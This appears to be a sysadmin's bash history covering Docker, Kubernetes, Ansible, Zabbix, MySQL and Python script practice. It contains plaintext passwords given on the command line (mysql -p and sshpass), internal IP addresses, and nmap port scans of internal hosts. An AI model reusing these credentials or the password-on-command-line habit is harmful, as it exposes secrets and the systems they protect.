vim move_.py
python move_.py 
vim m.txt
wc m.txt
python move_.py 
python3 move_.py 
vim move_.py 
python3 move_.py 
vim move_.py 
vim pass-auth.py
python3 pass-auth.py 
021Abc9Abc1
021ABC9000
python3 pass-auth.py 
vim pass-auth.py
python3 pass-auth.py 
vim pass-auth.py
python3 pass-auth.py 
echo $?
python3
vim pass-auth.py
python3 pass-auth.py 
jobs
kill -CONT %1
jobs
fg %1
vim pass-auth.py 
vim string_del.py
python3 string_del.py 
vim string_del.py
vim input_twice.py
python3 input_twice.py 
echo $?
vim input_twice.py
echo $?
python3 input_twice.py 
vim input_twice.py
python3 input_twice.py 
vim input_twice.py
vim test_ls.py
python3 test_ls.py 
vim test_ls.py 
python3 test_ls.py 
vim test_ls.py 
python3 test_ls.py 
vim test_ls.py 
docker run -d --name pause -p 8880:80 registry.cn-hangzhou.aliyuncs.com/google_containers/pause-amd64:3.1
docker image ls
docker ps -a
docker ps -a|grep registry
cat <<EOF >> nginx.confferror_log stderr;events { worker_connections 1024; }http {access_log /dev/stdout combined;server {listen 80 default_server;server_name example.com www.example.com;location / {proxy_pass http://127.0.0.1:2368;}}}EOF$ docker run -d --name nginx -v `pwd`/nginx.conf:/etc/nginx/nginx.conf --net=container:pause --ipc=container:pause --pid=container:pause nginx
EOF

cat <<EOF >> nginx.confferror_log stderr;events { worker_connections 1024; }http {access_log /dev/stdout combined;server {listen 80 default_server;server_name example.com www.example.com;location / {proxy_pass http://127.0.0.1:2368;}}}EOF
cat <<EOF >> nginx.confferror_log stderr;events { worker_connections 1024; }http {access_log /dev/stdout combined;server {listen 80 default_server;server_name example.com www.example.com;location / {proxy_pass http://127.0.0.1:2368;}}}
EOF

cat <<EOF >> nginx.confferror_log stderr;events { worker_connections 1024; }http {access_log /dev/stdout combined;server {listen 80 default_server;server_name example.com www.example.com;location / {proxy_pass http://127.0.0.1:2368;}}}
EOF

docker run -d --name nginx -v `pwd`/nginx.conf:/etc/nginx/nginx.conf --net=container:pause --ipc=container:pause --pid=container:pause nginx
docker ps -a|grep nginx
docker run -d --name ghost --net=container:pause --ipc=container:pause --pid=container:pause ghost
docker ps -a|grep ghost
vim /etc/docker/daemon.json
systemctl restart docker
journalctl -xe
journalctl -xe|tail -200
systemctl restart kubectl
free -m
docker ps -a
systemctl restart docker
vim /etc/docker/daemon.json
systemctl restart docker
systemctl reset-failed docker.service
systemctl start docker.service
docker ps -a
docker version
vim /etc/docker/daemon.json
systemctl restart docker
vim /etc/docker/daemon.json
systemctl restart docker
systemctl reset-failed docker.service
systemctl start docker.service
docker ps -a
docker run -d --name nginx -v `pwd`/nginx.conf:/etc/nginx/nginx.conf --net=container:pause --ipc=container:pause --pid=container:pause nginx
ls
vim docker-rm.txt 
docker ps -a |grep 'Exited' |awk '{print $1}' |xargs docker stop |xargs docker rm
docker ps -a |grep nginx
docker ps -a |grep nginx|docker rm
docker ps -a |grep nginx|xargs docker rm
docker ps -a |grep nginx|xargs docker stop|xargs docker rm
docker ps -a |grep nginx
docker run -d --name nginx -v `pwd`/nginx.conf:/etc/nginx/nginx.conf --net=container:pause --ipc=container:pause --pid=container:pause nginx
docker ps -a|grep registry
docker ps -a|grep ghost
docker ps -a|grep pause
docker ps -a|grep nginx
docker rm ghost
docker ps -a
docker run -d --name pause -p 8880:80 registry.cn-hangzhou.aliyuncs.com/google_containers/pause-amd64:3.1
docker run -d --name nginx -v `pwd`/nginx.conf:/etc/nginx/nginx.conf --net=container:pause --ipc=container:pause --pid=container:pause nginx
docker rm nginx
docker run -d --name nginx -v `pwd`/nginx.conf:/etc/nginx/nginx.conf --net=container:pause --ipc=container:pause --pid=container:pause
docker run -d --name nginx -v `pwd`/nginx.conf:/etc/nginx/nginx.conf --net=container:pause --ipc=container:pause --pid=container:pause nginx
docker rm nginx
docker images
docker rmi registry.cn-hangzhou.aliyuncs.com/google_containers/pause-amd64:3.1
docker images |grep nginx
docker ps -a|grep pause
docker run -d --name nginx -v `pwd`/nginx.conf:/etc/nginx/nginx.conf --net=container:pause --ipc=container:pause --pid=container:pause nginx
ls /
ls /data/
docker run -d --name nginx -v `pwd`/nginx.conf:/data/ --net=container:pause --ipc=container:pause --pid=container:pause nginx
docker rm nginx
docker run -d --name nginx -v `pwd`/nginx.conf:/data/ --net=container:pause --ipc=container:pause --pid=container:pause nginx
docker run -d --name ghost --net=container:pause --ipc=container:pause --pid=container:pause ghost
docker exec -it nginx -- /bin/sh
docker exec -it nginx -- ls/
docker exec -it nginx -- ls /
docker exec -it nginx  /bin/sh
docker exec -it nginx  /bin/bash
docker exec -it ghost /bin/sh
docker exec -it ghost /bin/bash
docker images|grep ghost
docker exec -it ghost /bin/sh -c
docker rm ghost
docker stop ghost
docker rm ghost
docker stop ngix
docker stop nginx
docker rm ngixn
docker rm nginx
docker rm pause
docker stop pause
docker rm pause
nginx --help
nginx -h
docker run -h
docker run --help
echo $$
ps -ef|grep 26974
vim /etc/docker/daemon.json
history|grep scp
history|grep admin
ssh 10.39.7.95
cd scripts01/
vim sort_count.py
python3 sort_count.py 
vim sort_count.py 
python3 sort_count.py 
vim sort_count.py 
python3 sort_count.py 
vim sort_count.py 
python3 sort_count.py 
vim sort_count.py 
python3 sort_count.py 
vim sort_count.py 
python3 sort_count.py 
ls[k][1] !=0
history|grep nc
nc -h
cd scripts01/
vim monitor_io_stats.sh
sh monitor_io_stats.sh 
locate syslog
　dmesg | awk '/(READ|WRITE|dirtied)/ {process[$1]++} END {for (x in process) \

　　print process[x],x}' |sort -nr |awk '{print $2 " " $1}' |  　　head -n 10
dmesg | awk '/(READ|WRITE|dirtied)/ {process[$1]++} END {for (x in process)\
print process[x],x}' |sort -nr |awk '{print $2 " " $1}' | head -n 10
vim /etc/nginx/nginx.conf
ls /var/log/nginx/
crontab -l
du access.log
du  /var/log/nginx/access.log
vim /etc/nginx/nginx.conf
less  /var/log/nginx/access.log
vim /etc/nginx/nginx.conf.default 
ls /etc/nginx/default.d/
ls /etc/nginx/conf.d/
vim /etc/nginx/fastcgi.conf
vim /etc/nginx/fastcgi.conf.default 
vim /etc/nginx/fastcgi_params
vim /etc/nginx/fastcgi_params.default 
vim /etc/nginx/koi-utf 
vim /etc/nginx/koi-win 
vim /etc/nginx/mime.types
vim /etc/nginx/mime.types.default 
vim /etc/nginx/scgi_params
vim /etc/nginx/scgi_params.default 
vim /etc/nginx/uwsgi_params
vim /etc/nginx/uwsgi_params.default 
vim /etc/nginx/win-utf 
ls /var/log/nginx/ -al
ab
man ab
date -h
man data|grep '%F'
man date|grep '%F'
date +%F
date +%f
date +%Y
date +%y
cat /proc/cpuinfo|grep ""processor
cat /proc/cpuinfo|grep "physical"
cat /proc/cpuinfo|grep "physical" |wc -l
date --date
date --date -1d
date --date -1day
date --date 2 day ago
date --date "-2 day"
date --date "2 days ago"  
date --date "-2 day2"
date --date "-2 days"
fdisk -l
vim linux_init.sh
scp linux_init.sh  root@10.134.98.81:/root
vim linux_init.sh 
cat /etc/profile
vim linux_init.sh 
 ping 10.148.55.151
ls /etc/yum.repos.d/
vim  /etc/yum.repos.d/CentOS-Base.repo 
vim /etc/selinux/config 
locate reboot
ssh 10.134.98.81
ping --help
man ping |grep '\-i'
traceroute -n 10.134.98.183
traceroute  10.134.98.183
traceroute  10.148.52.202
ip a
ifconfig
dns
nslookup
kubectl get svc
kubectl get ing
kubectl get ep
vim /etc/my.cnf
systemctl restart mysqld
vim /etc/my.cnf
systemctl restart mysqld
s='abc'
l='abcdef'
echo $l-$s
mtr
ping --help|grep '\-f'
man ping |grep "\-f"
ip a
mtr -c 40 -i 0.1 -n -r
mtr -c 40 -i 0.1 -n -r 10.134.196.22
mtr -c 40 -i 0.1 -n -r 10.150.7.55
mtr 10.150.7.55
traceroute 10.150.7.55
traceroute 10.150.7.55 -n
tcpdump -i ens160 -n -vv -p icmp and src host PTY |grep 'length 1024'
tcpdump -i ens160 -n -vv -p icmp and src host k |grep 'length 1024'
tcpdump -h
man tcpdump |grep '\-h'
man tcpdump |grep '\-p'
man tcpdump 
vim /etc/vimrc 
kubectl get no
kubectl get nodes
kubectl get node
lsblk
docker run -v 
docker run --help
ls /usr/share/nginx/html/
kubectl get pv
kubectl get pvc
cd manifests/
ls
cd volumes/
ls
vim pod-demo-vol.yaml 
vim pod-hostpath-vol.yaml 
vim pv-demo.yaml 
ls
cd ..
ls
vim steteful-demo.yaml 
cd configmap/
ls
cd ../volumes/
ls
vim pv-demo.yaml 
ulimit
ulimit -h
ulimit --help
man ulimit
vim pv-demo.yaml 
ip a
route -n
kubectl get ep
ping 10.39.1.212
ssh 10.134.98.81
cd scripts01/
lss
ls
vim mysql_io_sql_monitor.sh
mysql -uroot -pFoxconn99~ -e "show slave status\G"
mysql -uroot -p -e "show slave status\G"
mysql -uroot -p -e "show master status\G"
mysql -p
mysql -uroot -p -e "show master status;"
mysql -p
mysql -uroot -p -e "select * from mysql.user()"
mysql -uroot -p -e "select * from mysql.user();"
mysql -p
mysql -uroot -p -e "select * from mysql.user"
mysql -uroot -p -e "select * from mysql.user;"
 array=($($mysql_cmd -e "show slave status\G"|egrep ‘_Running|Behind_Master|Last_SQL_Errno‘|awk ‘{print $NF}‘))
 array=($($mysql_cmd -e "show slave status\G"|egrep '_Running|Behind_Master|Last_SQL_Errno'|awk {print $NF}')
array=($(mysql-p  -e "show slave status\G"|egrep '_Running|Behind_Master|Last_SQL_Errno'|awk '{print $NF}'))
array=($(mysql -p  -e "show slave status\G"|egrep '_Running|Behind_Master|Last_SQL_Errno'|awk '{print $NF}'))
mysql -p
ls
ps 
ps -ef
ps -ef|head -10
ps -ef|head -10|awk '{print $NF}'
array=($(ps -ef|head -10|awk '{print $NF}'))
array
echo $array
echo $array[0]
echo ${array[0]}
echo ${array[1]}
echo ${array[2]}
echo $array
echo ${array[#]}
echo ${array[@]}
echo ${array[*]}
echo ${array['*']}
echo ${array["*"]}
echo ${array["@"]}
errornum=(1158 1159 1008 1007 1062)
echo ${#errornum}
echo ${#errornum[*]}
echo $PWD
echo $OLDPWD
ls .*
ls ..*
ls ^.*
ls '^.*'
ls
ls cat.sh 
cat cat.sh 
chmid 7777 cat.sh 
chmod 7777 cat.sh 
ls -al cat.sh 
echo ${#errornum[0]}
echo ${#errornum}
echo ${#errornum[1]}
echo ${#errornum[2]}
echo ${#errornum[3]}
grep --help|grep '\-c'
mysql -p
nginx version
nginx --version
nginx -version
nginx -v
mtr
mtr -h
mtr --help
man mtr
ping 10.134.196.22
ping 10.150.7.55
ping k
vim /etc/hosts
ping k
vim /etc/hosts
ping k
vim string_sort2.py
python3 string_sort2.py 
vim string_sort2.py
python3 string_sort2.py 
vim string_sort2.py
ls
ls print*
vim print_str.py
python3 print_str.py 
vim print_str.py
vim int.py
python3 int.py 
vim int.py 
python3 int.py 
vim int.py 
python3 int.py 
vim long.py
python3 long.py 
vim long.py
python3 long.py 
vim long.py
rm long.py 
vim prim
vim l1-l2.py
python3 l1-l2.py 
vim l1-l2.py
python3 l1-l2.py 
vim l1-l2.py
python3 l1-l2.py 
vim l1-l2.py
python3 l1-l2.py 
vim l1-l2.py
python3 l1-l2.py 
vim l1-l2.py
python3 l1-l2.py 
vim l1-l2.py
python3 l1-l2.py 
vim l1-l2.py
python3 l1-l2.py 
vim l1-l2.py
python3 l1-l2.py 
vim l1-l2.py
python3 l1-l2.py 
vim l1-l2.py
python3 l1-l2.py 
vim l1-l2.py
python3 l1-l2.py 
vim l1-l2.py
python3 l1-l2.py 
vim l1-l2.py
vim /etc/vimrc 
vim l1-l2.py
python3 l1-l2.py 
vim l1-l2.py
python3 l1-l2.py 
vim l1-l2.py
python3 l1-l2.py 
vim l1-l2.py
python3 l1-l2.py 
vim l1-l2.py
python3 l1-l2.py 
vim l1-l2.py
python3 l1-l2.py 
vim l1-l2.py
python3 l1-l2.py 
vim l1-l2.py
python3 l1-l2.py 
vim l1-l2.py
python3 l1-l2.py 
vim l1-l2.py
python3 l1-l2.py 
vim l1-l2.py
python3 l1-l2.py 
vim l1-l2.py
python3 l1-l2.py 
        for i in sorted(set(l1)):
            print("%d %d"%(i[0],i[1]))
python3 l1-l2.py 
vim l1-l2.py
ansible -h
ansible docker02 -m ping 
vim /etc/ansible/
vim /etc/ansible/hosts
ansible docker02 -m shell -a "uptime -a" -o
ansible docker02 -m shell -a "uptime -a" 
ansible docker02 -m shell -a "uptime -r" 
uptime -a
uptime -v
uptime -s
ansible docker02 -m shell -a "uptime " 
kubectl get pv
kubectl get pvc
kubectl explain pods.spec.volumes
kubectl get pv
kubectl get pvc
kubectl get pvc -A
kubectl get pvc -A -o wide
kubectl get pv -A -o wide
locate *pvc*
kubectl get ns
kubectl get pv
vim ../manifests/steteful-demo.yaml 
lsblk
docker run --help
ansible playbook
ls
cd 
ls
cd ansible_test/
ls
vim install_httpd.yml 
ls /usr/bin/foo
ls /usr/bin/bar
tree
cd
tree
yum -y install tree
tree
ls
pwd
oldpwd
echo $OLDPWD
cd $OLDPWD
ansible --version
vim /etc/ansible/hosts 
for i in {1,2,3,6};do ssh-copy-id 192.168.218.3$i;done
pint 192.168.218.31
ping 192.168.218.31
mtr 192.168.218.31
mtr --help
man mtr
man mtr|grep '\-I'
vim /etc/ansible/ansible_test01
ls
vim /etc/ansible/hosts 
ansible tests -m ping -i /etc/ansible/ansible_test01 -o
ps -ef |grep zabbix
systemctl status zabbix
mysql -p
vim init-zabbix-agented.yml
ansible-playbook   -C init-zabbix-agented.yml 
vim init-zabbix-agented.yml
set --help
man set
echo "show global status where Variable_name='Threads_connected';" |  mysql -N | awk '{print $2}'
mysql --help|grep '\-n'
iostat
vmstat
ps -ef
ps aux
vmstat
locate zabbix
locate zabbix-agent
vim ansible_test/init-zabbix-agented.yml 
systemctl status zabbix-agent
ps -ef |grep zabbix
ps aux |grep zabbix
systemctl status zabbix
systemctl status zabbix-agent
systemctl status zabbix_agent
vim ~/.vimrc
cd ansible_test/
ls
vim install_httpd.yml 
sysctl --help
php -v
cd scripts01/
vim bw_count.py
python3 bw_count.py 
vim bw_count.py
python3 bw_count.py 
vim bw_count.py
python3 bw_count.py 
vim bw_count.py
python3 bw_count.py 
vim bw_count.py
python3 bw_count.py 
vim bw_count.py
python3 bw_count.py 
vim bw_count.py
python3 bw_count.py 
vim bw_count.py
python3 bw_count.py 
vim bw_count.py
python3 bw_count.py 
vim bw_count.py
python3 bw_count.py 
vim bw_count.py
python3 bw_count.py 
vim bw_count.py
python3 bw_count.py 
vim bw_count.py
python3 bw_count.py 
vim bw_count.py
python3 bw_count.py 
vim bw_count.py
python3 bw_count.py 
vim bw_count.py
python3 bw_count.py 
vim bw_count.py
python3 bw_count.py 
vim bw_count.py
python3 bw_count.py 
vim bw_count.py
python3 bw_count.py 
vim bw_count.py
python3 bw_count.py 
vim bw_count.py
python3 bw_count.py 
vim bw_count.py
python3 bw_count.py 
vim cal.py
python3 cal.py 
vim cal.py
python3 cal.py 
vim cal.py 
cd scripts01/
ls
vim bw_count.py 
python3 bw_count.py 
vim bw_count.py 
python3 bw_count.py 
vim bw_count.py 
python3 bw_count.py 
vim bw_count.py 
date +%f
date +%F
date --date=yyyymmdd
date --date=%yyyymmdd
date --help|grep '\-\-date'
cd ../manifests/
ls
vim steteful-demo.yaml 
cd manifests/
ls
cd volumes/
vim pv-demo.yaml 
cd scripts01/
python3
vim merge_encrypt.py 
python3 merge_encrypt.py 
vim merge_encrypt.py 
python3 merge_encrypt.py 
vim merge_encrypt.py 
python3
cd scripts01/
vim decrypt_encrypt.py
python3 decrypt_encrypt.py 
vim decrypt_encrypt.py
python3 decrypt_encrypt.py 
vim decrypt_encrypt.py
python3 decrypt_encrypt.py 
vim merge_encrypt.py
python3 decrypt_encrypt.py 
vim merge_encrypt.py
python3 decrypt_encrypt.py 
vim merge_encrypt.py
pwd
ls
vim merge_encrypt.py
python3 decrypt_encrypt.py 
vim merge_encrypt.py
python3 decrypt_encrypt.py 
vim merge_encrypt.py
python3 decrypt_encrypt.py 
python3
cat /proc/sys/fs/file-max
free -m
nginx -V
nginx version
nginx --version
nginx -version
ansible version
ls /tmp
ls /tmp -al
locate mysql.sock
cat /var/lib/mysql/mysql.sock
ls /var/lib/mysql/mysql.sock
less /var/lib/mysql/mysql.sock
less /var/lib/mysql/mysql.sock -f
less -f /var/lib/mysql/mysql.sock 
vim /var/lib/mysql/mysql.sock
vi /var/lib/mysql/mysql.sock
ls /var/lib/mysql/mysql.sock -al
mtr -c 400 -i 0.1 -n -r
ip a
ethtool ens160
mii-tool ens160
mii-tool 
seervice network status
service network status
ip link show ens160
top
mii-tool -v ens160
fdisk -l
df -hT
fdisk -l
ping 10.195.211.125
telnet  10.195.211.125 3389
nc -lnpk 22
nc -lnpk 3389
telnet 10.134.196.21 3389
telnet 10.134.196.22 22
nc -lnp 22
nmap -sS -sV 10.134.196.22
iftop -i eth0 -B
ip a
iftop -i ens160 -B
telnet 10.134.196.22 3389
for i in {1 2 3 4};do echo "the number is ${i}";done
for i in {1 2 3 4};do echo "the number is" ${i};done
for i in {1 2 3 4};do echo "the number is " ${i};done
for i in { 1 2 3 4 };do echo "the number is " ${i};done
for i in { 1,2,3,4 };do echo "the number is " ${i};done
ls .ssh/authorized_keys 
vim .ssh/authorized_keys 
sshpass -p Foxconn99 ssh-copy-id -i .ssh/id_rsa.pub root@10.134.196.22
vim .ssh/id_rsa.pub 
vim /etc/ansible/hosts 
ansible webserver -m ping
vim /etc/ansible/hosts 
ansible docker02 -m ping
ansible docker02 -m shell -a "utime -a"
ansible docker02 -m shell -a "uptime -a"
ansible docker02 -m shell -a "uptime -V"
vim /etc/ansible/hosts 
ansible docker -m shell -a "uptime -V"
python3
netstat -nltup | awk 'NR>2{print $4}' | grep ":10050"
netstat -nltup 
netstat -nltup | awk 'NR>2{print $4}' 
netstat -nltup | awk 'NR>2{print $4}' |grep 10050
systemctl status zabbix
systemctl status zabbix-server
systemctl restart zabbix-server
systemctl status zabbix-server
vim /etc/zabbix/zabbix_server.conf 
ps aux |grep zabbix
netstat -a |grep zabbix
netstat -an |grep 10050
netstat -an |grep 10051
vim /etc/zabbix/zabbix_server.conf 
netstat -an 
netstat -ant
systemctl restart zabbix-server
systemctl status zabbix-server
mysql -p
ps -ef |grep zabbix
vi /etc/httpd/conf/httpd.conf
mysql -u root -p
mysql -u zabbix -p
mysql -u root -p
vim /var/www/html
cat /var/www/html
vim /var/www/html/hostname.html 
vim /var/www/html/xss1.html 
locate zabbix
locate php.ini
vim /etc/php.ini
ps -ef |grep php
systemctl restart zabbix-server
vim /etc/php.ini
service php-fpm restart
ps aux |grep php
systemctl restart zabbix-server
vim /etc/php.ini
service php-fpm restart
systemctl restart php-fpm
systemctl status php-fpm
kill -l
kill -SIGHUP 32371
ps -ef |grep 323822
ps -ef |grep 32382
ps -ef
ps -aux |grep 32382
systemctl status php-fpm
systemctl restart php-fpm
systemctl status php-fpm
phpinfo() version()
phpinfo() 
php version
php -V
php --ini
php -
php -v
ps aux |grep php
vim /etc/php.ini
cat /etc/zabbix/zabbix_server.conf 
cat /etc/zabbix/zabbix_server.conf |grep DBsocket
systemctl restart httpd
locate setup.php
ls /usr/share/zabbix
cd /usr/share/doc/
ls
ls zabbix-server
ls -al  zabbix-server*
ls -al  zabbix-server-mysql
ls -al  zabbix-server-mysql*
ls -al|grep  zabbix-server-mysql
zabbix-server -V
zabbix -V
zabbix_server -V
zcat /usr/share/doc/zabbix-server-mysql-3.2.11/create.sql.gz | mysql -uzabbix -p -h 10.134.196.21 zabbix
zcat /usr/share/doc/zabbix-server-mysql-3.2.11/create.sql.gz
whereis zabbix
cd /etc/zabbix/
vim zabbix_server.conf 
vim /etc/httpd/conf.d/zabbix.conf 
systemctl start zabbix-server
systemctl status zabbix-server
systemctl enable zabbix-server
systemctl start httpd
systemctl enable httpd
systemctl status httpd
systemctl status httpd -l
vim /etc/httpd/conf/httpd.conf
vim /etc/httpd/conf.d/zabbix.conf 
vim zabbix_server.conf 
vim /etc/httpd/conf.d/zabbix.conf 
vim /etc/httpd/conf/httpd.conf
systemctl restart httpd
systemctl status httpd -l
netstat -ntlp
systemctl status zabbix-server
systemctl restart zabbix-server
systemctl status zabbix-server
netstat -ntlp
netstat -ntlp|grep zabbix
systemctl status zabbix-server
vim /etc/zabbix/zabbix_server.conf 
systemctl restart zabbix-server
systemctl status zabbix-server
systemctl status zabbix-server -l
ps -ef |grep zabbix
netstat -tlnp
history|tail -n 20
history|tail -n 200
 create table test03(val varchar(10));|mysql -u root -p -h 10.134.196.21 test01
 create table test03(val varchar(10))|mysql -u root -p -h 10.134.196.21 test01
 zcat /usr/share/doc/zabbix-server-mysql-3.2.11/create.sql.gz|tail -20
insert into test02 values("234")|mysql -u root -p -h 10.134.196.21 test01
insert into test02 values ("234")|mysql -u root -p -h 10.134.196.21 test01
insert into test02 values ("234");|mysql -u root -p -h 10.134.196.21 test01
insert into test02 values ("234"); | mysql -u root -p -h 10.134.196.21 test01
insert into `test02` values ("234"); | mysql -u root -p -h 10.134.196.21 test01
insert into test02 (`val`) values ("234"); | mysql -u root -p -h 10.134.196.21 test01
insert into test02 (val) values ("234"); | mysql -u root -p -h 10.134.196.21 test01
select * from test02 |mysql -uzabbix -p -h 10.134.196.21 test
select val from test02 |mysql -uzabbix -p -h 10.134.196.21 test
mysql -uzabbix -p -h 10.134.196.21 test -e "select val from test02"
mysql -uroot -p -h 10.134.196.21 test -e "select val from test02"
zcat /usr/share/doc/zabbix-server-mysql-3.2.11/create.sql.gz|head -n 10
userid
alias
surname
vim 1.txt
zcat 1.txt | mysql -uroot -p -h 10.134.196.21 test
cat 1.txt | mysql -uroot -p -h 10.134.196.21 test
tcpdump -i ens160 -n -vv -p icmp src and host IPADD |grep "length 1024"
tcpdump -i ens160 -n -vv -p icmp src and host 10.134.196.22 |grep "length 1024"
ip a
tcpdump -i ens160 -n -vv -p icmp and src host IPADD |grep "length 1024"
tcpdump -i ens160 -n -vv -p icmp and  src  host 10.134.196.22 |grep "length 1024"
mysql -p
ip a
ps -ef
top
cat /proc/864/oom_score
cat /proc/864/oom_adj
ps aux|grep mysqld
cat /proc/1651/oom_score
cat /proc/1651/oom_adj 
nmap -sS -sV -p- 10.150.7.55
python3
ls -al /etc/hosts
ls
ls -al
vim x16.py 
chmod 777 x16.py 
pwd
